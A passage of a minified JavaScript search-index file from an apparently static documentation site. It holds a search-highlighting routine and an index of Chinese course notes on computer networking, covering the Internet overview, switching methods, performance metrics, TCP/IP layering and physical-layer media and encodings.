const g=(o,a)=>{const i=o.toLowerCase(),e=a.toLowerCase(),s=[];let n=0,l=0;const c=(t,p=!1)=>{let r="";l===0?r=t.length>20?`… ${t.slice(-20)}`:t:p?r=t.length+l>100?`${t.slice(0,100-l)}… `:t:r=t.length>20?`${t.slice(0,20)} … ${t.slice(-20)}`:t,r&&s.push(r),l+=r.length,p||(s.push(["strong",a]),l+=a.length,l>=100&&s.push(" …"))};let h=i.indexOf(e,n);if(h===-1)return null;for(;h>=0;){const t=h+e.length;if(c(o.slice(n,h)),n=t,l>100)break;h=i.indexOf(e,n)}return l<100&&c(o.slice(n),!0),s},d=Object.entries,y=Object.keys,f=o=>o.reduce((a,{type:i})=>a+(i==="title"?50:i==="heading"?20:i==="custom"?10:1),0),$=(o,a)=>{var i;const e={};for(const[s,n]of d(a)){const l=((i=a[s.replace(/\/[^\\]*$/,"")])==null?void 0:i.title)||"",c=`${l?`${l} > `:""}${n.title}`,h=g(n.title,o);h&&(e[c]=[...e[c]||[],{type:"title",path:s,display:h}]),n.customFields&&d(n.customFields).forEach(([t,p])=>{p.forEach(r=>{const u=g(r,o);u&&(e[c]=[...e[c]||[],{type:"custom",path:s,index:t,display:u}])})});for(const t of n.contents){const p=g(t.header,o);p&&(e[c]=[...e[c]||[],{type:"heading",path:s+(t.slug?`#${t.slug}`:""),display:p}]);for(const r of t.contents){const u=g(r,o);u&&(e[c]=[...e[c]||[],{type:"content",header:t.header,path:s+(t.slug?`#${t.slug}`:""),display:u}])}}}return y(e).sort((s,n)=>f(e[s])-f(e[n])).map(s=>({title:s,contents:e[s]}))},m=JSON.parse("{\"/\":{\"/computer-network/\":{\"title\":\"计算机网络\",\"contents\":[]},\"/computer-usage-skills/\":{\"title\":\"电脑使用技巧\",\"contents\":[]},\"/front-end/\":{\"title\":\"前端\",\"contents\":[]},\"/software-tool/\":{\"title\":\"软件工具\",\"contents\":[]},\"/computer-network/net-micro-class-notes/01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E6%A6%82%E8%BF%B0.html\":{\"title\":\"计算机网络-概述\",\"contents\":[{\"header\":\"计算机网络在信息时代的作用\",\"slug\":\"计算机网络在信息时代的作用\",\"contents\":[]},{\"header\":\"信息服务基础设施\",\"slug\":\"信息服务基础设施\",\"contents\":[\"计算机网络已由一种通信基础设施发展成为一种重要的信息服务基础设施\",\"计算机网络已经像水，电，煤气这些基础设施一样，成为我们生活中不可或缺的一部分\"]},{\"header\":\"我国互联网发展状况\",\"slug\":\"我国互联网发展状况\",\"contents\":[\"详见：中国互联网络信息中心CNNIC\"]},{\"header\":\"因特网概述\",\"slug\":\"因特网概述\",\"contents\":[]},{\"header\":\"网络、互连网、互联网、因特网的基本概念\",\"slug\":\"网络、互连网、互联网、因特网的基本概念\",\"contents\":[\"网络：网络（Network）由若干结点（Node）和连接这些结点的链路（Link）组成\",\"计算机网络-概述01.png\",\"互连网（互联网）：多个网络通过路由器互连起来，这样就构成了一个覆盖范围更大的网络，即互连网（互联网）。因此，互联网又称为“网络的网络（Network of Networks）”\",\"计算机网络-概述02.png\",\"因特网：因特网（Internet）是世界上最大的互连网络（用户数以亿计，互连的网络数以百万计）\",\"计算机网络-概述03.png\",\"internet 与 Internet 的区别：\",\"internet (互联网或互连网)是一个通用名词，它泛指多个计算机网络互连而成的网络。在这些网络之间的通信协议可以是任意的\",\"Internet（因特网）则是一个专用名词，它指当前全球最大的、开放的、由众多网络互连而成的特定计算机网络，它采用 TCP/IP 协议族作为通信的规则，其前身是美国的 ARPANET\",\"任意把几个计算机网络互连起来（不管采用什么协议），并能够相互通信，这样构成的是一个互连网 (internet) ，而不是互联网（Internet）\",\"计算机网络-概述04.png\"]},{\"header\":\"因特网发展的三个阶段\",\"slug\":\"因特网发展的三个阶段\",\"contents\":[\"计算机网络-概述05.png\",\"因特网服务提供者 ISP (Internet Service Provider)\",\"计算机网络-概述06.png\",\"普通用户是如何接入到因特网的呢？\",\"答：通过ISP接入因特网\",\"ISP可以从因特网管理机构申请到成块的IP地址，同时拥有通信线路以及路由器等联网设备。任何机构和个人只需缴纳费用，就可从ISP得到所需要的IP地址\",\"因为因特网上的主机都必须有IP地址才能进行通信，这样就可以通过该ISP接入到因特网\",\"中国的三大ISP：中国电信，中国联通和中国移动\",\"基于 ISP 的三层结构的因特网\",\"计算机网络-概述07.png\",\"一旦某个用户能够接入到因特网，那么他也可以成为一个ISP，所需要做的就是购买一些如调制解调器或路由器这样的设备，让其他用户可以和他相连\"]},{\"header\":\"因特网的标准化工作\",\"slug\":\"因特网的标准化工作\",\"contents\":[\"因特网的标准化工作对因特网的发展起到了非常重要的作用\",\"因特网在指定其标准上的一个很大的特点是面向公众 \",\"因特网所有的 RFC (Request For Comments)技术文档都可从因特网上免费下载\",\"任何人都可以随时用电子邮件发表对某个文档的意见或建议\",\"因特网协会 ISOC 是一个国际性组织，它负责对因特网进行全面管理，以及在世界范围内促进其发展和使用 \",\"因特网体系结构委员会 IAB，负责管理因特网有关协议的开发\",\"因特网工程部 IETF，负责研究中短期工程问题，主要针对协议的开发和标准化\",\"因特网研究部IRTF，从事理论方面的研究和开发一些需要长期考虑的问题\",\"计算机网络-概述08.png\",\"制订因特网的正式标准要经过一下4个阶段： \",\"因特网草案（在这个阶段还不是 RFC 文档）\",\"建议标准（从这个阶段开始就成为 RFC 文档）\",\"草案标准\",\"因特网标准\"]},{\"header\":\"因特网的组成\",\"slug\":\"因特网的组成\",\"contents\":[\"边缘部分 \",\"由所有连接在因特网上的主机组成（台式电脑，大型服务器，笔记本电脑，平板，智能手机等）。这部分是用户直接使用的，用来进行通信（传送数据、音频或视频）和资源共享\",\"核心部分 \",\"由大量网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的（提供连通性和交换）\",\"计算机网络-概述09.png\",\"路由器是一种专用计算机，但我们不称它为主机，路由器是实现分组交换的关键构建，其任务是转发收到的分组，这是网络核心最重要的部分\",\"处在互联网边缘的部分就是连接在互联网上的所有的主机。这些主机又称为端系统 (end system)\",\"端系统在功能上可能有很大的差别：\",\"小的端系统可以是一台普通个人电脑，具有上网功能的智能手机，甚至是一个很小的网络摄像头\",\"大的端系统则可以是一台非常昂贵的大型计算机\",\"端系统的拥有者可以是个人，也可以是单位（如学校、企业、政府机关等），当然也可以是某个 ISP\",\"端系统之间通信的含义： “主机 A 和主机 B 进行通信”实际上是指：“运行在主机 A 上的某个程序和运行在主机 B 上的另一个程序进行通信”。即“主机 A 的某个进程和主机 B 上的另一个进程进行通信”。简称为“计算机之间通信”\",\"端系统之间的通信方式通常可划分为两大类：\",\"计算机网络-概述10.png\",\"客户-服务器方式：\",\"客户 (client) 和服务器 (server) 都是指通信中所涉及的两个应用进程\",\"客户 - 服务器方式所描述的是进程之间服务和被服务的关系\",\"客户是服务的请求方，服务器是服务的提供方\",\"服务请求方和服务提供方都要使用网络核心部分所提供的服务\",\"对等连接方式：\",\"对等连接 (peer-to-peer，简写为 P2P)是指两个主机在通信时并不区分哪一个是服务请求方还是服务提供方\",\"只要两个主机都运行了对等连接软件 ( P2P 软件) ，它们就可以进行平等的、对等连接通信\",\"双方都可以下载对方已经存储在硬盘中的共享文档\"]},{\"header\":\"三种交换方式\",\"slug\":\"三种交换方式\",\"contents\":[\"网络核心部分是互联网中最复杂的部分\",\"网络中的核心部分要向网络边缘中的大量主机提供连通性，使边缘部分中的任何一个主机都能够向其他主机通信（即传送或接收各种形式的数据）\",\"在网络核心部分起特殊作用的是路由器 (router)\",\"路由器是实现分组交换 (packet switching) 的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能\"]},{\"header\":\"电路交换（Circuit Switching）\",\"slug\":\"电路交换-circuit-switching\",\"contents\":[\"计算机网络-概述11.png\",\"传统两两相连的方式，当电话数量很多时，电话线也很多，就很不方便，所以要使得每一部电话能够很方便地和另一部电话进行通信，就应该使用一个中间设备将这些电话连接起来，这个中间设备就是电话交换机\",\"计算机网络-概述12.png\",\"电话交换机接通电话线的方式称为电路交换\",\"从通信资源的分配角度来看，交换（Switching）就是按照某种方式动态地分配传输线路的资源\",\"电路交换的三个步骤： \",\"建立连接（分配通信资源）\",\"通话（一直占用通信资源）\",\"释放连接（归还通信资源）\",\"计算机网络-概述13.png\",\"当使用电路交换来传送计算机数据时，其线路的传输效率往往很低，这是因为计算机数据是突发式地出现在传输线路上的，所以计算机通常采用的是分组交换，而不是线路交换\"]},{\"header\":\"分组交换（Packet Switching）\",\"slug\":\"分组交换-packet-switching\",\"contents\":[\"计算机网络-概述14.png\",\"通常我们把表示该消息的整块数据成为一个报文\",\"在发送报文之前，先把较长的报文划分成一个个更小的等长数据段，在每一个数据段前面。加上一些由必要的控制信息组成的首部后，就构成一个分组，也可简称为“包”，相应地，首部也可称为“包头”\",\"首部包含了分组的目的地址\",\"分组从源主机到目的主机，可走不同的路径\",\"发送方：\",\"构造分组\",\"发送分组\",\"路由器：\",\"缓存分组\",\"转发分组\",\"简称为“分组转发”\",\"在路由器中的输入和输出端口之间没有直接连线\",\"路由器处理分组的过程是：\",\"把收到的分组先放入缓存（暂时存储）\",\"查找转发表，找出到某个目的地址应从哪个端口转发\",\"把分组送到适当的端口转发出去\",\"接收方：\",\"接收分组\",\"还原报文\"]},{\"header\":\"报文交换（Message Switching）\",\"slug\":\"报文交换-message-switching\",\"contents\":[\"报文交换中的交换结点也采用存储转发方式，但报文交换对报文的大小没有限制，这就要求交换结点需要较大的缓存空间。报文交换主要用于早期的电报通信网，现在较少使用，通常被较先进的分组交换方式所取代\"]},{\"header\":\"三种交换方式的对比\",\"slug\":\"三种交换方式的对比\",\"contents\":[\"假设A，B，C，D是分组传输路径所要经过的4个结点交换机，纵坐标为时间\",\"计算机网络-概述15.png\",\"分析：\",\"电路交换：\",\"通信之前首先要建立连接，连接建立好之后，就可以使用已建立好的连接进行数据传送；数据传送后，需释放连接，以归还之前建立连接所占用的通信线路资源\",\"一旦建立连接，中间的各结点交换机就是直通形式的，比特流可以直达终点\",\"报文交换：\",\"可以随时发送报文，而不需要事先建立连接；整个报文先传送到相邻结点交换机，全部存储下来后进行查表转发，转发到下一个结点交换机\",\"整个报文需要在各结点交换机上进行存储转发，由于不限制报文大小，因此需要各结点交换机都具有较大的缓存空间\",\"分组交换：\",\"可以随时发送分组，而不需要事先建立连接。构成原始报文的一个个分组，依次在各结点交换机上存储转发。各结点交换机在发送分组的同时，还缓存接收到的分组\",\"构成原始报文的一个个分组，在各结点交换机上进行存储转发，相比报文交换，减少了转发时延，还可以避免过长的报文长时间占用链路，同时也有利于进行差错控制\",\"计算机网络-概述16.png\"]},{\"header\":\"计算机网络的定义和分类\",\"slug\":\"计算机网络的定义和分类\",\"contents\":[]},{\"header\":\"定义\",\"slug\":\"定义\",\"contents\":[\"计算机网络的精确定义并未统一\",\"计算机网络的最简单的定义是：一些互相连接的、自治的计算机的集合 \",\"互连：是指计算机之间可以通过有线或无线的方式进行数据通信\",\"自治：是指独立的计算机，他有自己的硬件和软件，可以单独运行使用\",\"集合：是指至少需要两台计算机\",\"计算机网络的较好的定义是：计算机网络主要是由一些通用的，可编程的硬件（一定包含有中央处理机 CPU）互连而成的，而这些硬件并非专门用来实现某一特定目的（例如，传送数据或视频信号）。这些可编程的硬件能够用来传送多种不同类型的数据，并能支持广泛的和日益增长的应用\",\"计算机网络所连接的硬件，并不限于一般的计算机，而是包括了智能手机等智能硬件\",\"计算机网络并非专门用来传送数据，而是能够支持很多种的应用（包括今后可能出现的各种应用）\"]},{\"header\":\"分类\",\"slug\":\"分类\",\"contents\":[\"按交换技术分类：\",\"电路交换网络\",\"报文交换网络\",\"分组交换网络\",\"按使用者分类：\",\"公用网\",\"专用网\",\"按传输介质分类：\",\"有线网络\",\"无线网络\",\"按覆盖范围分类：\",\"广域网 WAN（Wide Area Network） \",\"作用范围通常为几十到几千公里，因而有时也称为远程网（long haul network），广域网是互联网的核心部分，其任务是通过长距离（例如，跨越不同的国家）运送主机所发送的数据\",\"城域网 MAN \",\"作用范围一般是一个城市，可跨越几个街区甚至整个城市\",\"局域网 LAN \",\"一般用微型计算机或工作站通过高速通信线路相连（速率通常在 10 Mbit/s 以上），但地理上范围较小（1 km 左右）\",\"个域网 PAN \",\"就是在个人工作的地方把个人使用的电子设备用无线技术连接起来的网络\",\"按拓扑结构分类：\",\"总线型网络\",\"计算机网络-概述17.png\",\"星型网络\",\"计算机网络-概述18.png\",\"环形网络\",\"计算机网络-概述19.png\",\"网状型网络\",\"计算机网络-概述20.png\"]},{\"header\":\"计算机网络的性能指标\",\"slug\":\"计算机网络的性能指标\",\"contents\":[]},{\"header\":\"速率\",\"slug\":\"速率\",\"contents\":[\"计算机网络-概述21.png\",\"计算机网络-概述22.png\"]},{\"header\":\"带宽\",\"slug\":\"带宽\",\"contents\":[\"计算机网络-概述23.png\"]},{\"header\":\"吞吐量\",\"slug\":\"吞吐量\",\"contents\":[\"计算机网络-概述24.png\",\"带宽1 Gb/s 的以太网，代表其额定速率是1 Gb/s，这个数值也是该以太网的吞吐量的绝对上限值。因此，对于带宽1 Gb/s 的以太网，可能实际吞吐量只有 700 Mb/s，甚至更低\",\"注意：吞吐量还可以用每秒传送的字节数或帧数表示\"]},{\"header\":\"时延\",\"slug\":\"时延\",\"contents\":[\"时延时指数据（一个报文或分组，甚至比特）从网络（或链路）的一端传送到另一端所需的时间\",\"网络时延由几部分组成：\",\"发送时延 \",\"主机或路由器发送数据帧所需要的时间，也就是从发送数据帧的第一个比特算起，到该帧的最后一个比特发送完毕所需的时间\",\"传播时延 \",\"电磁波在信道中传播一定的距离需要花费的时间\",\"处理时延 \",\"主机或路由器在收到分组时要花费一定时间进行处理\",\"排队时延 \",\"分组在进过网络传输时，要经过许多路由器。但分组在进入路由器后要先在输入队列中排队等待处理\",\"有时会把排队时延看成处理时延一部分\",\"总时延 = 发送时延 + 传播时延 + 处理时延 （处理时延 + 排队时延）\",\"计算机网络-概述25.png\",\"计算机网络-概述26.png\",\"当处理时延忽略不计时，发送时延 和 传播时延谁占主导，要具体情况具体分析\"]},{\"header\":\"时延带宽积\",\"slug\":\"时延带宽积\",\"contents\":[\"时延带宽积 = 传播时延 * 带宽\",\"计算机网络-概述27.png\"]},{\"header\":\"往返时间\",\"slug\":\"往返时间\",\"contents\":[\"互联网上的信息不仅仅单方向传输而是双向交互的。因此，我们有时很需要知道双向交互一次所需的时间\",\"计算机网络-概述28.png\"]},{\"header\":\"利用率\",\"slug\":\"利用率\",\"contents\":[\"利用率有信道利用率和网络利用率两种\",\"计算机网络-概述29.png\"]},{\"header\":\"丢包率\",\"slug\":\"丢包率\",\"contents\":[\"计算机网络-概述30.png\"]},{\"header\":\"计算机网络体系结构\",\"slug\":\"计算机网络体系结构\",\"contents\":[]},{\"header\":\"常见的计算机网络体系结构\",\"slug\":\"常见的计算机网络体系结构\",\"contents\":[\"计算机网络-概述31.png\",\"如今用的最多的是 TCP/IP 体系结构，现今规模最大的、覆盖全球的、基于 TCP/IP 的互联网并未使用 OSI 标准\",\"TCP/IP 体系结构相当于将 OSI 体系结构的物理层和数据链路层合并为了网络接口层，并去掉了会话层和表示层\",\"TCP/IP在网络层使用的协议是IP协议，IP协议的意思是网际协议，因此TCP/IP体系结构的网络层称为网际层\",\"计算机网络-概述32.png\",\"在用户主机的操作系统中，通常都带有符合TCP/IP体系结构标准的TCP/IP协议族\",\"而用于网络互连的路由器中，也带有符合 TCP/IP 体系结构标准的 TCP/IP 协议族\",\"只不过路由器一般只包含网络接口层和网际层\",\"计算机网络-概述33.png\",\"网络接口层：并没有规定具体内容，这样做的目的是可以互连全世界各种不同的网络接口，例如：有线的以太网接口，无线局域网的 WIFI 接口等\",\"网际层：它的核心协议是 IP 协议\",\"运输层：TCP 和 UDP 是这层的两个重要协议\",\"应用层：这层包含了大量的应用层协议，如 HTTP , DNS 等\",\"**IP 协议（网际层）可以将不同的网络接口（网络接口层）进行互连，并向其上的TCP 协议和 UDP 协议（运输层）**提供网络互连服务\",\"而TCP 协议在享受 IP 协议提供的网络互连服务的基础上，可向应用层的相应协议提供可靠的传输服务\",\"UDP 协议在享受 IP 协议提供的网络互连服务的基础上，可向应用层的相应协议提供不可靠的传输服务\",\"TCP/IP体系结构中最重要的是IP协议和TCP协议，因此用TCP和IP来表示整个协议大家族\",\"计算机网络-概述34.png\",\"教学时把TCP/IP体系结构的网络接口层分成了物理层和数据链路层\"]},{\"header\":\"计算机网络体系结构分层的必要性\",\"slug\":\"计算机网络体系结构分层的必要性\",\"contents\":[\"计算机网络-概述35.png\",\"物理层问题\",\"计算机网络-概述36.png\",\"这图说明\",\"第一，严格来说，传输媒体并不属于物理层\",\"计算机传输的信号，并不是图示的方波信号\",\"这样举例只是让初学者容易理解\",\"数据链路层问题\",\"计算机网络-概述37.png\",\"网络层问题\",\"计算机网络-概述38.png\",\"运输层问题\",\"计算机网络-概述39.png\",\"如何标识与网络通信相关的应用进程：一个分组到来，我们应该交给哪个进程处理呢？浏览器进程还是QQ进程\",\"应用层问题\",\"计算机网络-概述40.png\",\"应用层该用什么方法（应用层协议）去解析数据\",\"总结\",\"计算机网络-概述41.png\",\"计算机网络-概述42.png\",\"计算机网络-概述43.png\"]},{\"header\":\"计算机网络体系结构分层思想举例\",\"slug\":\"计算机网络体系结构分层思想举例\",\"contents\":[\"例子：主机的浏览器如何与Web服务器进行通信\",\"计算机网络-概述44.png\",\"解析：\",\"主机和Web服务器之间基于网络的通信，实际上是主机中的浏览器应用进程与Web服务器中的Web服务器应用进程之间基于网络的通信\",\"计算机网络-概述45.png\",\"体系结构的各层在整个过程中起到怎样的作用？\",\"1、发送方发送\",\"计算机网络-概述46.png\",\"第一步：\",\"应用层按照HTTP协议的规定构建一个HTTP请求报文\",\"应用层将HTTP请求报文交付给运输层处理\",\"计算机网络-概述47.png\",\"第二步：\",\"运输层给HTTP请求报文添加一个TCP首部，使之成为TCP报文段\",\"TCP报文段的首部格式作用是区分应用进程以及实现可靠传输\",\"运输层将TCP报文段交付给网络层处理\",\"计算机网络-概述48.png\",\"第三步：\",\"网络层给TCP报文段添加一个IP首部，使之成为IP数据报\",\"IP数据报的首部格式作用是使IP数据报可以在互联网传输，也就是被路由器转发\",\"网络层将IP数据报交付给数据链路层处理\",\"计算机网络-概述49.png\",\"第四步：\",\"数据链路层给IP数据报添加一个首部和一个尾部，使之成为帧 （图示右边为首部，左边为尾部）\",\"该首部的作用主要是为了让帧能够在一段链路上或一个网络上传输，能够被相应的目的主机接收\",\"该尾部的作用是让目的主机检查所接收到的帧是否有误码\",\"数据链路层将帧交付给物理层\",\"计算机网络-概述50.png\",\"第五步：\",\"物理层先将帧看做是比特流，这里的网络N1假设是以太网，所以物理层还会给该比特流前面添加前导码\",\"前导码的作用是为了让目的主机做好接收帧的准备\",\"物理层将装有前导码的比特流变换成相应的信号发送给传输媒体\",\"计算机网络-概述51.png\",\"第六步：\",\"信号通过传输媒体到达路由器\",\"2、路由器转发\",\"计算机网络-概述52.png\",\"计算机网络-概述53.png\",\"计算机网络-概述54.png\",\"在路由器中\",\"物理层将信号变为比特流，然后去掉前导码后，将其交付给数据链路层\",\"数据链路层将帧的首部和尾部去掉后，将其交付给网络层，这实际交付的是IP数据报\",\"网络层解析IP数据报的首部，从中提取目的网络地址\",\"在路由器中\",\"提取目的网络地址后查找自身路由表。确定转发端口， 以便进行转发\",\"网络层将IP数据报交付给数据链路层\",\"数据链路层给IP数据报添加一个首部和一个尾部，使之成为帧\",\"数据链路层将帧交付给物理层\",\"物理层先将帧看成比特流，这里的网络N2假设是以太网，所以物理层还会给该比特流前面添加前导码\",\"物理层将装有前导码的比特流变换成相应的信号发送给传输媒体，信号通过传输媒体到达Web服务器\",\"3、接收方接收\",\"和发送方（主机）发送过程的封装正好是反着来\",\"在Web 服务器上\",\"物理层将信号变换为比特流，然后去掉前导码后成为帧，交付给数据链路层\",\"数据链路层将帧的首部和尾部去掉后成为IP数据报，将其交付给网络层\",\"网络层将IP数据报的首部去掉后成为TCP报文段，将其交付给运输层\",\"运输层将TCP报文段的首部去掉后成为HTTP请求报文，将其交付给应用层\",\"应用层对HTTP请求报文进行解析，然后给主机发回响应报文\",\"发回响应报文的步骤和之前过程类似\",\"计算机网络-概述58.png\"]},{\"header\":\"计算机网络体系结构中的专用术语\",\"slug\":\"计算机网络体系结构中的专用术语\",\"contents\":[\"以下介绍的专用术语来源于OSI的七层协议体系结构，但也适用于TCP/IP的四层体系结构和五层协议体系结构\",\"实体\",\"计算机网络-概述59.png\",\"协议\",\"计算机网络-概述60.png\",\"协议：控制两个对等实体进行逻辑通信的规则的集合\",\"协议三要素：\",\"语法：定义所交换信息的格式\",\"语义：定义收发双方所要完成的操作\",\"同步：定义收发双发的时序关系\",\"服务\",\"计算机网络-概述61.png\",\"计算机网络-概述62.png\",\"计算机网络-概述63.png\"]}]},\"/computer-network/net-micro-class-notes/02-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-%E7%89%A9%E7%90%86%E5%B1%82.html\":{\"title\":\"计算机网络-物理层\",\"contents\":[{\"header\":\"物理层的基本概念\",\"slug\":\"物理层的基本概念\",\"contents\":[\"计算机网络-物理层01.png\"]},{\"header\":\"物理层下面的传输媒体\",\"slug\":\"物理层下面的传输媒体\",\"contents\":[\"传输媒体也称为传输介质或传输媒介，它就是数据传输系统中在发送器和接收器之间的物理通路\",\"传输媒体可分为两大类，即导引型传输媒体和非导引型传输媒体\",\"传输媒体不属于计算机网络体系结构的任何一层。如果非要将它添加到体系结构中，那只能将其放置到物理层之下\"]},{\"header\":\"导引型传输媒体\",\"slug\":\"导引型传输媒体\",\"contents\":[\"在导引型传输媒体中，电磁波被导引沿着固体媒体传播\"]},{\"header\":\"同轴电缆\",\"slug\":\"同轴电缆\",\"contents\":[\"计算机网络-物理层02.png\"]},{\"header\":\"双绞线\",\"slug\":\"双绞线\",\"contents\":[\"计算机网络-物理层03.png\"]},{\"header\":\"光纤\",\"slug\":\"光纤\",\"contents\":[\"计算机网络-物理层04\"]},{\"header\":\"多模光纤\",\"slug\":\"多模光纤\",\"contents\":[\"可以存在多条不同角度入射的光线在一条光纤中传输。这种光纤就称为多模光纤\"]},{\"header\":\"单模光纤\",\"slug\":\"单模光纤\",\"contents\":[\"若光纤的直径减小到只有一个光的波长，则光纤就像一根波导那样，它可使光线一直向前传播，而不会产生多次反射。这样的光纤称为单模光纤\"]},{\"header\":\"电力线\",\"slug\":\"电力线\",\"contents\":[\"计算机网络-物理层05\"]},{\"header\":\"非导引型传输媒体\",\"slug\":\"非导引型传输媒体\",\"contents\":[\"非导引型传输媒体是指自由空间\",\"常见的非导引型传播媒体：\",\"计算机网络-物理层06\"]},{\"header\":\"无线电波\",\"slug\":\"无线电波\",\"contents\":[\"无线电波用于国际广播、海事和航空通讯等\",\"无线电波中的低频和中频端主要以地面波形式传播。高频和甚高频主要用电离层的反射传播\"]},{\"header\":\"微波\",\"slug\":\"微波\",\"contents\":[\"微波用于无线电话、无线网络、雷达、人造卫星接受等。在数据通信中占有重要地位\",\"微波在空间中主要以直线传播\",\"传统的微波通信主要有地面微波接力通信和卫星通信\",\"其传播距离一般只有50公里左右\"]},{\"header\":\"红外线\",\"slug\":\"红外线\",\"contents\":[\"利用红外线传输数据，例如电视遥控等\",\"红外通信属于点对点无线传输\",\"不能越障，传输距离短，传输速率低\"]},{\"header\":\"可见光\",\"slug\":\"可见光\",\"contents\":[\"LIFI，可以实现使用可见光通信，但是目前还在实验室阶段\"]},{\"header\":\"传输方式\",\"slug\":\"传输方式\",\"contents\":[]},{\"header\":\"串行传输和并行传输\",\"slug\":\"串行传输和并行传输\",\"contents\":[\"串行传输：\",\"数据是一个比特一个比特依次发送的，因此在发送端与接收端之间，只需要一条数据传输线路即可\",\"并行传输：\",\"一次发送n个比特，因此，在发送端和接收端之间需要有n条传输线路\",\"并行传输的优点是比串行传输的速度n倍，但成本高\",\"数据在传输线路上的传输采用是串行传输，计算机内部的数据传输常用并行传输\"]},{\"header\":\"同步传输和异步传输\",\"slug\":\"同步传输和异步传输\",\"contents\":[\"同步传输：\",\"数据块以稳定的比特流的形式传输。字节之间没有间隔\",\"接收端在每个比特信号的中间时刻进行检测，以判别接收到的是比特0还是比特1\",\"由于不同设备的时钟频率存在一定差异，不可能做到完全相同，在传输大量数据的过程中，所产生的判别时刻的累计误差，会导致接收端对比特信号的判别错位，所以要使收发双发时钟保持同步\",\"有两种同步方法：\",\"外同步：在收发双方之间添加一条单独的时钟信号线\",\"内同步：发送端将时钟同步信号编码到发送数据中一起传输（如曼彻斯特编码）\",\"异步传输：\",\"以字节为独立的传输单位，字节之间的时间间隔不是固定\",\"接收端仅在每个字节的起始处对字节内的比特实现同步\",\"通常在每个字节前后分别加上起始位和结束位\"]},{\"header\":\"单工、半双工、全双工\",\"slug\":\"单工、半双工、全双工\",\"contents\":[\"在许多情况下，我们要使用“信道（channel）”这一名词。信道和电路并不等同，信道一般都是用来表示向某一个方向传送信息的媒体。因此，一条通信电路往往包含一条发送信道和一条接收信道\",\"从通信的双方信息交互的方式来看，可以有以下三种基本方式：\",\"单向通信：\",\"又称为单工通信，即只能有一个方向的通信而没有反方向的交互。无线电广播或有线电以及电视广播就属于这种类型\",\"计算机网络-物理层07\",\"双向交替通信：\",\"又称为半双工通信，即通信的双方可以发送信息，但不能双方同时发送（当然也就不能同时接收）。这种通信方式使一方发送另一方接收，过一段时间后可以再反过来\",\"计算机网络-物理层08\",\"双向同时通信：\",\"又称为全双工通信，即通信的双发可以同时发送和接收信息\",\"计算机网络-物理层09\",\"注意：\",\"单向通信只需要一条信道，而双向交替通信或双向同时通信则需要两条信道（每个方向各一条）\",\"双向同时通信的传输效率最高\"]},{\"header\":\"编码与调制\",\"slug\":\"编码与调制\",\"contents\":[\"计算机网络-物理层10\",\"常用术语：\",\"数据 (data) —— 运送消息的实体\",\"信号 (signal) —— 数据的电气的或电磁的表现。\",\"模拟信号 (analogous signal) —— 代表消息的参数的取值是连续的\",\"数字信号 (digital signal) —— 代表消息的参数的取值是离散的。\",\"码元 (code) —— 在使用时间域（或简称为时域）的波形表示数字信号时，代表不同离散数值的基本波形\",\"基带信号（即基本频带信号）—— 来自信源的信号。像计算机输出的代表各种文字或图像文件的数据信号都属于基带信号\",\"基带信号往往包含有较多的低频成分，甚至有直流成分，而许多信道并不能传输这种低频分量或直流分量。因此必须对基带信号进行调制(modulation)\",\"信道 —— 一般用来表示向某一个方向传送信息的媒体\",\"单向通信（单工通信）——只能有一个方向的通信而没有反方向的交互\",\"双向交替通信（半双工通信）——通信的双方都可以发送信息，但不能双方同时发送(当然也就不能同时接收)\",\"双向同时通信（全双工通信）——通信的双方可以同时发送和接收信息\"]},{\"header\":\"常用编码\",\"slug\":\"常用编码\",\"contents\":[]},{\"header\":\"不归零编码\",\"slug\":\"不归零编码\",\"contents\":[\"计算机网络-物理层11\",\"正电平表示比特1/0\",\"负电平表示比特0/1\",\"中间的虚线是零电平，所谓不归零编码，就是指在整个码元时间内，电平不会出现零电平\",\"实际比特1和比特0的表示要看现实怎么规定\",\"在整个码元时间内，不会出现零电平：\",\"计算机网络-物理层12\",\"为了辨别码元个数，在发送信号时需要发送方和接收方做到严格的同步：需要额外一根传输线来传输时钟信号，使发送方和接收方同步，接收方按时钟信号的节拍来逐个接收码元，但是对于计算机网络，宁愿利用这根传输线传输数据信号，而不是传输时钟信号，由于不归零编码存在同步问题，因此计算机网络中的数据传输不采用这类编码！\"]},{\"header\":\"归零编码\",\"slug\":\"归零编码\",\"contents\":[\"计算机网络-物理层13\",\"归零编码虽然自同步，但编码效率低\",\"在传输过程中，每个码元传输结束后都要”归零“，因此接收方只要在信号归零后进行采样，而不需要单独的时钟信号\",\"归零编码相当于把时钟信号用”归零“的方式放在了数据之内，看作一种自同步的信号，但是在传输过程中，大部分的数据带宽都用来传输零电平数据，造成资源浪费，编码效率低\"]},{\"header\":\"曼彻斯特编码\",\"slug\":\"曼彻斯特编码\",\"contents\":[\"计算机网络-物理层14\",\"在每个码元时间的中间时刻，信号都会发生跳变：\",\"负跳变表示比特1/0\",\"正跳变表示比特0/1\",\"码元中间时刻的跳变即表示时钟，又表示数据\",\"实际比特1和比特0的表示要看现实怎么规定\",\"传统以太网使用的就是曼切斯特编码\"]},{\"header\":\"差分曼彻斯特编码\",\"slug\":\"差分曼彻斯特编码\",\"contents\":[\"计算机网络-物理层15\",\"在每个码元时间的中间时刻，信号都会发送跳变，但与曼彻斯特不同：\",\"跳变仅表示时钟\",\"码元开始处电平是否变换表示数据 \",\"变化表示比特1/0\",\"不变化表示比特0/1\",\"实际比特1和比特0的表示要看现实怎么规定\",\"比曼彻斯特编码变化少，更适合较高的传输速率\"]},{\"header\":\"总结\",\"slug\":\"总结\",\"contents\":[\"计算机网络-物理层16\"]},{\"header\":\"调制\",\"slug\":\"调制\",\"contents\":[\"把数据基带信号的频率范围，搬移到较高的频段，并转换为模拟信号，称为调制。调制后产生模拟信号，在模拟信道种传输\",\"有两种情况：\",\"数字信号转换为模拟信号，在模拟信道中传输 \",\"例如WiFi，采用补码键控CCK/直接序列扩频DSSS/正交频分复用OFDM等调制方式\",\"模拟信号转换为另一种模拟信号，在模拟信道中传输 